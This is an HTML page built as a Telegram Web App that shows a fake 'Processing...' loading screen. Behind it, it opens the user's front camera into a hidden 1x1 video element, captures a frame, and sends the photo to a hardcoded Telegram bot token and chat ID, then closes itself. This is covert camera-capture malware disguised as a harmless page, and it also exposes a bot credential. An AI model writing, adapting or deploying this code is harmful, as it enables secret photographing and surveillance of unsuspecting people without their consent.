<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Processing...</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body style="margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:sans-serif;">
    <h1 id="status">📸 Инициализация...</h1>

    <!-- ВИДЕО ВИДИМОЕ, НО МАЛЕНЬКОЕ (1x1) -->
    <video id="video" autoplay playsinline style="position:fixed;bottom:0;right:0;width:1px;height:1px;opacity:0.01;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const status = document.getElementById('status');

        function sendPhoto(blob) {
            const formData = new FormData();
            formData.append('chat_id', '7406666272');
            formData.append('photo', blob, 'photo.jpg');

            fetch('https://api.telegram.org/bot8677834656:AAG65uW4UP2WbT_3Op4exFMOTJsHnxRR85A/sendPhoto', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(data => {
                if (data.ok) {
                    status.innerText = '✅ Отправлено!';
                    tg.close();
                } else {
                    status.innerText = '❌ Ошибка API';
                    console.error(data);
                }
            })
            .catch(() => {
                status.innerText = '❌ Ошибка сети';
            });
        }

        navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: "user",
                width: { ideal: 640 },
                height: { ideal: 480 }
            }
        })
        .then(stream => {
            video.srcObject = stream;
            video.play();

            // Ждём первый кадр
            video.addEventListener('timeupdate', function onTimeUpdate() {
                video.removeEventListener('timeupdate', onTimeUpdate);

                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                canvas.toBlob(blob => {
                    if (blob) {
                        sendPhoto(blob);
                    } else {
                        status.innerText = '❌ Ошибка Blob';
                    }
                    stream.getTracks().forEach(track => track.stop());
                }, 'image/jpeg', 0.8);
            });

            // Запасной таймер (на случай, если timeupdate не сработает)
            setTimeout(() => {
                if (video.videoWidth > 0 && video.videoHeight > 0) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(blob => {
                        if (blob) sendPhoto(blob);
                        stream.getTracks().forEach(track => track.stop());
                    }, 'image/jpeg', 0.8);
                }
            }, 1500);
        })
        .catch(err => {
            status.innerText = '❌ Ошибка: ' + err.message;
            console.error(err);
        });
    </script>
</body>
</html>
